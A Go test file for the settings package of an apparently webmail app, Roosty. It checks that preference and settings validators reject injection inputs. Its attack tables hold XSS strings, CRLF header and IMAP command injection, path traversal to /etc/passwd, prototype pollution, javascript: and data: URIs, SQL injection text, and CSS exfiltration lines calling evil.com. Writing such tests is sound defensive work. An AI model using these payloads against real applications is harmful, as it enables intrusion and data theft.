package settings

import (
	"encoding/json"
	"strings"
	"testing"
)

// Attack payloads against every JSON shape Roosty stores. Each must be refused.

func TestParsePrefs_RejectsAttacks(t *testing.T) {
	many := func(n int, s string) string {
		parts := make([]string, n)
		for i := range parts {
			parts[i] = strings.Replace(s, "N", string(rune('a'+i%26))+strings.Repeat("x", i/26), 1)
		}
		return strings.Join(parts, ",")
	}
	attacks := map[string]string{
		"prototype pollution":          `{"__proto__":{"isAdmin":true}}`,
		"constructor pollution":        `{"constructor":{"prototype":{"x":1}}}`,
		"unknown field":                `{"theme":"claro","isAdmin":true}`,
		"theme path traversal":         `{"theme":"../../etc/passwd"}`,
		"theme html":                   `{"theme":"<script>alert(1)</script>"}`,
		"accent css injection":         `{"accent":"red;background:url(https://x)"}`,
		"accent short hex":             `{"accent":"#fff"}`,
		"density injection":            `{"density":"compact\"};alert(1)//"}`,
		"font size":                    `{"fontSize":"huge"}`,
		"display name html":            `{"displayName":"<img src=x onerror=alert(1)>"}`,
		"display name quotes":          `{"displayName":"Ana\" <evil@x.com>"}`,
		"display name bidi override":   `{"displayName":"fatura\u202Eexe.pdf"}`,
		"display name null byte":       `{"displayName":"a\u0000b"}`,
		"display name CRLF":            `{"displayName":"Ana\r\nBcc: evil@x.com"}`,
		"display name too long":        `{"displayName":"` + strings.Repeat("a", 101) + `"}`,
		"signature too long":           `{"signature":"` + strings.Repeat("a", 2001) + `"}`,
		"signature carriage return":    `{"signature":"a\rb"}`,
		"trusted javascript":           `{"trustedSenders":["javascript:alert(1)"]}`,
		"trusted header injection":     `{"trustedSenders":["a@b.com\r\nBcc: x@y.com"]}`,
		"trusted with name":            `{"trustedSenders":["Evil <a@b.com>"]}`,
		"trusted duplicates":           `{"trustedSenders":["a@b.com","a@b.com"]}`,
		"trusted too many":             `{"trustedSenders":[` + many(1001, `"N@b.com"`) + `]}`,
		"wrong type number":            `{"theme":123}`,
		"wrong type string for list":   `{"trustedSenders":"a@b.com"}`,
		"wrong type object":            `{"displayName":{"$gt":""}}`,
		"null":                         `null`,
		"array":                        `[{"theme":"claro"}]`,
		"string":                       `"claro"`,
		"empty":                        ``,
		"trailing data":                `{"theme":"claro"} {"theme":"navy"}`,
		"duplicate key overrides":      `{"theme":"claro","theme":"<x>"}`,
		"deep nesting":                 `{"theme":` + strings.Repeat("[", 20000) + strings.Repeat("]", 20000) + `}`,
		"oversized body":               `{"signature":"` + strings.Repeat("a", 70<<10) + `"}`,
		"invalid utf-8":                "{\"displayName\":\"\xff\xfe\"}",
		"truncated":                    `{"theme":"claro"`,
	}
	for name, payload := range attacks {
		if _, err := ParsePrefs(strings.NewReader(payload)); err == nil {
			t.Errorf("%s: accepted %q", name, trim(payload))
		}
	}
}

func TestParsePrefs_AcceptsValidAndCanonicalizes(t *testing.T) {
	p, err := ParsePrefs(strings.NewReader(`{"theme":"navy","accent":"#3D63DD","density":"compact","fontSize":"large",
		"displayName":"  Marina Gonçalves  ","signature":"Marina\nroosty.dev","trustedSenders":["News@Roosty.dev"]}`))
	if err != nil {
		t.Fatal(err)
	}
	if p.DisplayName != "Marina Gonçalves" || p.TrustedSenders[0] != "news@roosty.dev" {
		t.Errorf("not canonicalized: %+v", p)
	}
	// SQL-looking text is plain text: allowed, stored through parameterized queries.
	if _, err := ParsePrefs(strings.NewReader(`{"displayName":"Robert'); DROP TABLE accounts;--"}`)); err != nil {
		t.Errorf("plain text rejected: %v", err)
	}
	raw, _ := json.Marshal(p)
	if strings.Contains(string(raw), "isAdmin") {
		t.Error("unexpected field after re-encoding")
	}
}

func validSettings() Settings {
	s := Defaults()
	s.Mail.IMAP = Endpoint{Host: "mail.roosty.dev", Port: 993, Security: "tls"}
	s.Mail.SMTP = Endpoint{Host: "mail.roosty.dev", Port: 465, Security: "tls"}
	s.Access = Access{Mode: "domains", Domains: []string{"roosty.dev"}}
	s.Branding.Links = Links{Support: "https://roosty.dev/help", Privacy: ""}
	return s
}

func TestSettings_ValidPasses(t *testing.T) {
	if err := validSettings().Validate(); err != nil {
		t.Fatal(err)
	}
	if err := Defaults().Validate(); err != nil {
		t.Fatalf("defaults must be valid: %v", err)
	}
}

func TestSettings_RejectsAttacks(t *testing.T) {
	cases := map[string]func(*Settings){
		"imap host CRLF command injection": func(s *Settings) { s.Mail.IMAP.Host = "mail.x.com\r\nA1 LOGIN x y" },
		"imap host with path":              func(s *Settings) { s.Mail.IMAP.Host = "mail.x.com/evil" },
		"port zero":                        func(s *Settings) { s.Mail.SMTP.Port = 0 },
		"port too high":                    func(s *Settings) { s.Mail.SMTP.Port = 70000 },
		"unknown security":                 func(s *Settings) { s.Mail.IMAP.Security = "ssl3" },
		"unknown access mode":              func(s *Settings) { s.Access.Mode = "everyone" },
		"domain wildcard":                  func(s *Settings) { s.Access.Domains = []string{"*.com"} },
		"domain CRLF":                      func(s *Settings) { s.Access.Domains = []string{"evil.com\r\nx"} },
		"domain single label":              func(s *Settings) { s.Access.Domains = []string{"localhost"} },
		"account with display name":        func(s *Settings) { s.Access.Accounts = []string{"Evil <a@b.com>"} },
		"account not an email":             func(s *Settings) { s.Access.Accounts = []string{"' OR 1=1 --"} },
		"name with html":                   func(s *Settings) { s.Branding.Name = "<script>alert(1)</script>" },
		"name too long":                    func(s *Settings) { s.Branding.Name = strings.Repeat("a", 81) },
		"name bidi":                        func(s *Settings) { s.Branding.Name = "Roosty\u202E" },
		"accent css":                       func(s *Settings) { s.Branding.Accent = "red}body{display:none" },
		"unknown theme":                    func(s *Settings) { s.Branding.Themes = []string{"claro", "hacker"} },
		"duplicate theme":                  func(s *Settings) { s.Branding.Themes = []string{"claro", "claro"} },
		"default theme not offered":        func(s *Settings) { s.Branding.Themes = []string{"navy"}; s.Branding.DefaultTheme = "claro" },
		"login title control char":         func(s *Settings) { s.Branding.LoginTitle = "Entrar\u0007" },
		"login message too long":           func(s *Settings) { s.Branding.LoginMessage = strings.Repeat("a", 501) },
		"support link javascript":          func(s *Settings) { s.Branding.Links.Support = "javascript:alert(document.cookie)" },
		"support link JaVaScRiPt":          func(s *Settings) { s.Branding.Links.Support = "JaVaScRiPt:alert(1)" },
		"privacy link data uri":            func(s *Settings) { s.Branding.Links.Privacy = "data:text/html,<script>alert(1)</script>" },
		"privacy link scheme relative":     func(s *Settings) { s.Branding.Links.Privacy = "//evil.com" },
		"privacy link credentials":         func(s *Settings) { s.Branding.Links.Privacy = "https://user:pass@evil.com" },
		"privacy link vbscript":            func(s *Settings) { s.Branding.Links.Privacy = "vbscript:msgbox(1)" },
		"css import":                       func(s *Settings) { s.Branding.CustomCSS = "@import url(https://evil.com/x.css);" },
		"css url exfiltration":             func(s *Settings) { s.Branding.CustomCSS = "input[value^=a]{background:url(https://evil.com/a)}" },
		"css expression":                   func(s *Settings) { s.Branding.CustomCSS = "div{width:expression(alert(1))}" },
		"css style breakout":               func(s *Settings) { s.Branding.CustomCSS = "</style><script>alert(1)</script>" },
		"css escape obfuscation":           func(s *Settings) { s.Branding.CustomCSS = `div{background:\75\72\6c(https://evil.com)}` },
		"css javascript":                   func(s *Settings) { s.Branding.CustomCSS = "a{behavior:url(x.htc)}" },
		"css too long":                     func(s *Settings) { s.Branding.CustomCSS = strings.Repeat("a", 20001) },
		"unknown logo kind":                func(s *Settings) { s.Branding.Logos = []string{"../../etc/passwd"} },
	}
	for name, mutate := range cases {
		s := validSettings()
		mutate(&s)
		if err := s.Validate(); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func TestDecodeStrict_Settings(t *testing.T) {
	attacks := map[string]string{
		"unknown top-level field": `{"isAdmin":true}`,
		"unknown nested field":    `{"branding":{"name":"x","script":"alert(1)"}}`,
		"wrong type":              `{"mail":{"imap":{"port":"993"}}}`,
		"array instead of object": `[]`,
		"prototype pollution":     `{"__proto__":{"admin":true}}`,
	}
	for name, payload := range attacks {
		var s Settings
		if err := DecodeStrict(strings.NewReader(payload), 1<<20, &s); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
}

func FuzzParsePrefs(f *testing.F) {
	f.Add(`{"theme":"claro"}`)
	f.Add(`{"trustedSenders":["a@b.com"]}`)
	f.Fuzz(func(t *testing.T, s string) {
		p, err := ParsePrefs(strings.NewReader(s))
		if err == nil && p.Validate() != nil {
			t.Fatalf("accepted prefs that fail validation: %q", s)
		}
	})
}

func trim(s string) string {
	if len(s) > 60 {
		return s[:60] + "…"
	}
	return s
}
